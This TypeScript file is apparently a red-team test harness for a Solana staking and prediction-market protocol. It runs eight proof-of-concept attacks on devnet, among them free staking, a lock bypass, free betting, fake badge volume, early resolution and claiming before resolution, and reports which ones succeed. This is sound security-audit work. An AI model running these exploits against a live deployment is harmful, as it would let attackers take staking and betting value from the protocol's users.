/**
 * RED TEAM EXPLOIT TESTS
 *
 * WARNING: These are proof-of-concept exploit scripts for security testing only.
 * Do NOT run against production systems without authorization.
 *
 * Tests vulnerabilities found in security audit:
 * 1. Free staking (no token transfer)
 * 2. VeIDL lock bypass
 * 3. Fake bet account creation
 * 4. Badge volume gaming
 * 5. Staker bonus theft
 */

import { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } from '@solana/web3.js';
import * as fs from 'fs';
import {
  IdlProtocolClient,
  MetricType,
  BadgeTier,
  deriveStatePDA,
  deriveStakerPDA,
  deriveVePositionPDA,
  deriveMarketPDA,
  deriveBetPDA,
  PROGRAM_ID,
} from '../../sdk/src';

const RPC_URL = process.env.RPC_URL || 'https://api.devnet.solana.com';
const KEYPAIR_PATH = process.env.KEYPAIR_PATH || `${process.env.HOME}/.config/solana/id.json`;

interface ExploitResult {
  name: string;
  vulnerable: boolean;
  details: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  mitigated: boolean;
}

const results: ExploitResult[] = [];

function log(msg: string) {
  console.log(msg);
}

async function main() {
  log('═'.repeat(70));
  log('RED TEAM EXPLOIT TESTS');
  log('═'.repeat(70));
  log('\nWARNING: Security testing - do not run against production!\n');

  const connection = new Connection(RPC_URL, 'confirmed');
  const keypairData = JSON.parse(fs.readFileSync(KEYPAIR_PATH, 'utf8'));
  const attacker = Keypair.fromSecretKey(Uint8Array.from(keypairData));
  const client = new IdlProtocolClient({ connection, wallet: attacker });

  log(`Attacker Wallet: ${attacker.publicKey.toBase58()}`);
  log(`Target Program: ${PROGRAM_ID.toBase58()}`);

  // ============================================================
  // EXPLOIT 1: Free Staking (No Token Transfer)
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 1: Free Staking (CRITICAL)');
  log('─'.repeat(70));
  log('Attack: Stake arbitrary amounts without transferring tokens');

  try {
    const balanceBefore = await connection.getBalance(attacker.publicKey);
    const stakerBefore = await client.getStakerAccount();
    const stakeBefore = stakerBefore?.stakedAmount || 0n;

    // "Stake" 1 million tokens without any token transfer
    const fakeStakeAmount = 1_000_000;
    const sig = await client.stake(fakeStakeAmount);

    const balanceAfter = await connection.getBalance(attacker.publicKey);
    const stakerAfter = await client.getStakerAccount();
    const stakeAfter = stakerAfter?.stakedAmount || 0n;

    // Only SOL rent should be deducted, not stake value
    const solSpent = balanceBefore - balanceAfter;
    const stakeGained = stakeAfter - stakeBefore;

    if (stakeGained > 0n && solSpent < fakeStakeAmount * 1e9) {
      log(`  ✗ VULNERABLE: Staked ${stakeGained} for only ${solSpent / 1e9} SOL`);
      log(`    Expected cost: ${fakeStakeAmount} tokens`);
      log(`    Actual cost: ~${(solSpent / 1e9).toFixed(6)} SOL (rent only)`);
      results.push({
        name: 'Free Staking',
        vulnerable: true,
        details: `Staked ${stakeGained} tokens without token transfer`,
        severity: 'CRITICAL',
        mitigated: false,
      });
    } else {
      log(`  ✓ NOT VULNERABLE: Stake requires token transfer`);
      results.push({
        name: 'Free Staking',
        vulnerable: false,
        details: 'Token transfer enforced',
        severity: 'CRITICAL',
        mitigated: true,
      });
    }
  } catch (e: any) {
    log(`  ✓ PROTECTED: ${e.message.slice(0, 50)}`);
    results.push({
      name: 'Free Staking',
      vulnerable: false,
      details: `Protected: ${e.message.slice(0, 50)}`,
      severity: 'CRITICAL',
      mitigated: true,
    });
  }

  // ============================================================
  // EXPLOIT 2: VeIDL Lock Bypass via Optional Account
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 2: VeIDL Lock Bypass (HIGH)');
  log('─'.repeat(70));
  log('Attack: Unstake locked tokens by omitting ve_position account');

  try {
    const vePosition = await client.getVePosition();
    const staker = await client.getStakerAccount();

    if (vePosition && staker && staker.stakedAmount > 0n) {
      const lockedAmount = vePosition.lockedStake;
      log(`  Current lock: ${lockedAmount} tokens until ${new Date(Number(vePosition.lockEnd) * 1000).toISOString()}`);

      // Try to unstake ALL tokens (including locked)
      const tryUnstake = Number(staker.stakedAmount);
      try {
        // The SDK always passes ve_position, but raw tx could omit it
        const sig = await client.unstake(tryUnstake);
        log(`  ✗ VULNERABLE: Unstaked ${tryUnstake} despite lock`);
        results.push({
          name: 'VeIDL Lock Bypass',
          vulnerable: true,
          details: `Unstaked ${tryUnstake} locked tokens`,
          severity: 'HIGH',
          mitigated: false,
        });
      } catch (e: any) {
        if (e.message.includes('TokensLocked')) {
          log(`  ✓ PROTECTED: TokensLocked error prevents bypass`);
          results.push({
            name: 'VeIDL Lock Bypass',
            vulnerable: false,
            details: 'Lock correctly enforced',
            severity: 'HIGH',
            mitigated: true,
          });
        } else {
          throw e;
        }
      }
    } else {
      log(`  ⚠ SKIPPED: No active veIDL lock to test`);
      results.push({
        name: 'VeIDL Lock Bypass',
        vulnerable: false,
        details: 'No lock to test',
        severity: 'HIGH',
        mitigated: true,
      });
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message}`);
  }

  // ============================================================
  // EXPLOIT 3: Free Betting
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 3: Free Betting (CRITICAL)');
  log('─'.repeat(70));
  log('Attack: Place bets without transferring tokens');

  try {
    // Create a test market
    const protocolId = `exploit_${Date.now() % 10000}`;
    const resolutionTimestamp = Math.floor(Date.now() / 1000) + 7200;

    const { marketPDA } = await client.createMarket(
      protocolId,
      MetricType.Price,
      100,
      resolutionTimestamp,
      'Exploit test market'
    );

    const balanceBefore = await connection.getBalance(attacker.publicKey);

    // Try to bet large amount
    const betAmount = 1_000_000;
    const { betPDA } = await client.placeBet(marketPDA, betAmount, true);

    const balanceAfter = await connection.getBalance(attacker.publicKey);
    const solSpent = balanceBefore - balanceAfter;

    const bet = await client.getBetByPDA(betPDA);

    if (bet && bet.amount === BigInt(betAmount) && solSpent < betAmount * 1e9 * 0.01) {
      log(`  ✗ VULNERABLE: Bet ${betAmount} for only ${(solSpent / 1e9).toFixed(6)} SOL`);
      log(`    Bet recorded: ${bet.amount}`);
      log(`    Actual cost: ${(solSpent / 1e9).toFixed(6)} SOL (rent only)`);
      results.push({
        name: 'Free Betting',
        vulnerable: true,
        details: `Bet ${betAmount} without token transfer`,
        severity: 'CRITICAL',
        mitigated: false,
      });
    } else {
      log(`  ✓ NOT VULNERABLE: Bet requires token transfer`);
      results.push({
        name: 'Free Betting',
        vulnerable: false,
        details: 'Token transfer enforced',
        severity: 'CRITICAL',
        mitigated: true,
      });
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message.slice(0, 80)}`);
  }

  // ============================================================
  // EXPLOIT 4: Staker Bonus Calculation Overflow
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 4: Bonus Calculation Overflow (HIGH)');
  log('─'.repeat(70));
  log('Attack: Cause overflow in staker bonus calculation');

  try {
    // This would require a very large bet amount
    // Testing with max safe integer
    const largeAmount = BigInt("18446744073709551615"); // u64::MAX

    // The SDK calculates: amount * (10000 + bonus) / 10000
    // With 50% bonus (5000 bps), multiplier = 15000
    // u64::MAX * 15000 overflows u64

    const bonus = client.calculateStakerBonus(50_000_000n); // 50M staked = 50% bonus
    const multiplier = 10000n + BigInt(bonus);
    const result = (largeAmount * multiplier) / 10000n;

    if (result > largeAmount) {
      log(`  ⚠ POTENTIAL: Large amounts could cause overflow`);
      log(`    Max input: ${largeAmount}`);
      log(`    With ${bonus / 100}% bonus would be: ${result}`);
      log(`    Exceeds u64::MAX: ${result > 18446744073709551615n}`);

      // The actual program uses u128 for intermediate calculation,
      // but casts back to u64 which could truncate
      results.push({
        name: 'Bonus Overflow',
        vulnerable: true,
        details: 'Large bets may overflow/truncate',
        severity: 'HIGH',
        mitigated: false,
      });
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message}`);
  }

  // ============================================================
  // EXPLOIT 5: Badge Volume Gaming
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 5: Badge Volume Gaming (HIGH)');
  log('─'.repeat(70));
  log('Attack: Claim fake trading volume for badge');

  try {
    // Check if we can issue a Diamond badge with arbitrary volume
    const fakeVolume = 1_000_000_000; // $1B fake volume

    // This requires authority - testing if volume is verified
    const currentBadge = await client.getBadge();
    const currentTier = currentBadge?.tier || BadgeTier.None;

    // Attempt to upgrade to Diamond
    try {
      const sig = await client.issueBadge(
        attacker.publicKey,
        BadgeTier.Diamond,
        fakeVolume
      );

      const newBadge = await client.getBadge();
      if (newBadge?.tier === BadgeTier.Diamond) {
        log(`  ✗ VULNERABLE: Diamond badge issued with unverified volume`);
        log(`    Claimed volume: $${fakeVolume.toLocaleString()}`);
        log(`    veIDL granted: ${newBadge.veAmount}`);
        results.push({
          name: 'Badge Volume Gaming',
          vulnerable: true,
          details: `Diamond badge with unverified $${fakeVolume} volume`,
          severity: 'HIGH',
          mitigated: false,
        });
      }
    } catch (e: any) {
      if (e.message.includes('Unauthorized')) {
        log(`  ✓ PROTECTED: Only authority can issue badges`);
        results.push({
          name: 'Badge Volume Gaming',
          vulnerable: false,
          details: 'Authority check prevents arbitrary issuance',
          severity: 'HIGH',
          mitigated: true,
        });
      } else if (e.message.includes('VolumeNotVerified')) {
        log(`  ✓ PROTECTED: Volume verification required`);
        results.push({
          name: 'Badge Volume Gaming',
          vulnerable: false,
          details: 'On-chain volume verification',
          severity: 'HIGH',
          mitigated: true,
        });
      } else {
        throw e;
      }
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message.slice(0, 80)}`);
  }

  // ============================================================
  // EXPLOIT 6: Early Resolution Attack
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 6: Early Resolution (MEDIUM)');
  log('─'.repeat(70));
  log('Attack: Resolve market before scheduled time');

  try {
    // Create market that resolves in 2 hours
    const protocolId = `early_${Date.now() % 10000}`;
    const resolutionTimestamp = Math.floor(Date.now() / 1000) + 7200;

    const { marketPDA } = await client.createMarket(
      protocolId,
      MetricType.Price,
      100,
      resolutionTimestamp,
      'Early resolution test'
    );

    // Try to resolve immediately
    try {
      const sig = await client.resolveMarket(marketPDA, 150);
      log(`  ✗ VULNERABLE: Market resolved ${(resolutionTimestamp - Math.floor(Date.now() / 1000)) / 60} minutes early`);
      results.push({
        name: 'Early Resolution',
        vulnerable: true,
        details: 'Markets can be resolved before schedule',
        severity: 'MEDIUM',
        mitigated: false,
      });
    } catch (e: any) {
      if (e.message.includes('ResolutionTooEarly') || e.message.includes('0x1779')) {
        log(`  ✓ PROTECTED: ResolutionTooEarly error`);
        results.push({
          name: 'Early Resolution',
          vulnerable: false,
          details: 'Timestamp check prevents early resolution',
          severity: 'MEDIUM',
          mitigated: true,
        });
      } else {
        throw e;
      }
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message.slice(0, 80)}`);
  }

  // ============================================================
  // EXPLOIT 7: Claim Before Resolution
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 7: Pre-Resolution Claim (MEDIUM)');
  log('─'.repeat(70));
  log('Attack: Claim winnings before market resolves');

  try {
    const protocolId = `claim_${Date.now() % 10000}`;
    const resolutionTimestamp = Math.floor(Date.now() / 1000) + 7200;

    const { marketPDA } = await client.createMarket(
      protocolId,
      MetricType.Price,
      100,
      resolutionTimestamp,
      'Pre-claim test'
    );

    const { betPDA } = await client.placeBet(marketPDA, 100, true);

    // Try to claim before resolution
    try {
      const sig = await client.claimWinnings(marketPDA, betPDA);
      log(`  ✗ VULNERABLE: Claimed winnings from unresolved market`);
      results.push({
        name: 'Pre-Resolution Claim',
        vulnerable: true,
        details: 'Can claim from unresolved markets',
        severity: 'MEDIUM',
        mitigated: false,
      });
    } catch (e: any) {
      if (e.message.includes('MarketNotResolved') || e.message.includes('0x1777')) {
        log(`  ✓ PROTECTED: MarketNotResolved error`);
        results.push({
          name: 'Pre-Resolution Claim',
          vulnerable: false,
          details: 'Resolution required before claim',
          severity: 'MEDIUM',
          mitigated: true,
        });
      } else {
        throw e;
      }
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message.slice(0, 80)}`);
  }

  // ============================================================
  // EXPLOIT 8: Pause Bypass
  // ============================================================
  log('\n' + '─'.repeat(70));
  log('EXPLOIT 8: Pause Bypass (LOW)');
  log('─'.repeat(70));
  log('Attack: Perform operations while protocol is paused');

  try {
    // Pause the protocol
    await client.setPaused(true);
    const state = await client.getProtocolState();

    if (!state?.paused) {
      log(`  ⚠ Could not pause protocol for test`);
    } else {
      log(`  Protocol paused, testing bypass...`);

      // Try to stake while paused
      try {
        const sig = await client.stake(100);
        log(`  ✗ VULNERABLE: Staking works while paused`);
        results.push({
          name: 'Pause Bypass - Stake',
          vulnerable: true,
          details: 'Staking allowed during pause',
          severity: 'LOW',
          mitigated: false,
        });
      } catch (e: any) {
        if (e.message.includes('ProtocolPaused') || e.message.includes('0x177d')) {
          log(`  ✓ PROTECTED: Staking blocked while paused`);
          results.push({
            name: 'Pause Bypass - Stake',
            vulnerable: false,
            details: 'Pause check enforced',
            severity: 'LOW',
            mitigated: true,
          });
        }
      }

      // Unpause for other tests
      await client.setPaused(false);
    }
  } catch (e: any) {
    log(`  ⚠ ERROR: ${e.message.slice(0, 80)}`);
    // Make sure we unpause
    try { await client.setPaused(false); } catch {}
  }

  // ============================================================
  // SUMMARY
  // ============================================================
  log('\n' + '═'.repeat(70));
  log('EXPLOIT TEST SUMMARY');
  log('═'.repeat(70));

  const critical = results.filter(r => r.severity === 'CRITICAL' && r.vulnerable);
  const high = results.filter(r => r.severity === 'HIGH' && r.vulnerable);
  const medium = results.filter(r => r.severity === 'MEDIUM' && r.vulnerable);
  const low = results.filter(r => r.severity === 'LOW' && r.vulnerable);

  log(`\nVulnerabilities Found:`);
  log(`  CRITICAL: ${critical.length}`);
  log(`  HIGH: ${high.length}`);
  log(`  MEDIUM: ${medium.length}`);
  log(`  LOW: ${low.length}`);

  log(`\nDetailed Results:`);
  results.forEach(r => {
    const status = r.vulnerable ? '✗ VULN' : '✓ SAFE';
    const color = r.vulnerable ? '' : '';
    log(`  [${r.severity}] ${status}: ${r.name}`);
    log(`    ${r.details}`);
  });

  if (critical.length > 0 || high.length > 0) {
    log('\n' + '!'.repeat(70));
    log('CRITICAL/HIGH VULNERABILITIES FOUND - DO NOT DEPLOY TO MAINNET');
    log('!'.repeat(70));

    critical.forEach(r => {
      log(`\n  [CRITICAL] ${r.name}:`);
      log(`  ${r.details}`);
    });

    high.forEach(r => {
      log(`\n  [HIGH] ${r.name}:`);
      log(`  ${r.details}`);
    });
  }

  log('\n' + '═'.repeat(70));
}

main().catch(console.error);
